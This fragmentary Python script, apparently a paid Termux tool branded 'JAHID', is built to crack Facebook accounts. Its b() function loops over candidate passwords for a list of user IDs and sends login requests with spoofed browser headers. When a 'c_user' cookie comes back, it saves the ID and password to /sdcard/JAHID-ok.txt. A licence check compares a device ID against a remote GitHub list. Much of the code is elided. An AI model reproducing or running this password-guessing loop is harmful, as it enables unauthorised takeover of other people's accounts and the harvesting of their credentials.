...
\ \033[;0m\033[1;91m\033[1;92m
	\033[1;32m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
	\033[1;32m┃\033[1;93m─━<WELCOME TO JAHID TERMUX ZONE>━─\033[1;32m┃
	\033[1;32m┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫
	\033[1;32m┃\033[1;32mDEVELOPER : \033[1;33m   JAHID┃
	\033[1;32m┃\033[1;33mFACEBOOK  :   \033[1;32mJAHIDTEN        ┃
	\033[1;32m┃\033[1;32mGITHUB    :   \033[1;33JAHID10              ┃
	\033[1;32m┃\033[1;33mWATHSAPP  :   \033[1;32m+88013230****       ┃
	\033[1;32m┃\033[1;32mFROM      :   \033[1;33mBANGLADESH           ┃
	\033[1;32m╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝""")
A = '\x1b[1;97m' 
B = '\x1b[1;96m' 
C = '\x1b[1;91m' 
...
def admin():
	...
	if bal =='2':
		...
		admin()
	if bal =='3':
		os.system('xdg-open https://github.com/JAHID-143');time.sleep(1)
		admin()
	if bal =='0':
		Main()
...
def b(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r \033[1;90m[\033[1;93m[JAHID]\033[1;90m] \033[1;96m%s/%s\033[1;90m \033[1;90m[\033[1;92mOK:%s\033[1;90m] '%(loop,tl,len(oks))),
            sys.stdout.flush()
   ...
   'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                oks.append(cid)
                open('/sdcard/JAHID-ok.txt', 'a').write(uid+' | '+ps+' | '+uid+'\n')
                break
            else:
                continue
        loop+=1        
...
def superuser():
    ...
    id = "5".join(uuid)
    print(logo)
    DARK=requests.get("https://github.com/JAHID/PTryOne/blob/main/PTryOne.txt").text
    if id in DARK:
        Main()
    else:
        os.system("clear")
        ...
        print ("\n")
        os.system("espeak \"assalamualaikum ,I am JAHID VAI er  ROBOT and my boss is JAHID.Sir this tool is paid because 100% ok id just now login\"")
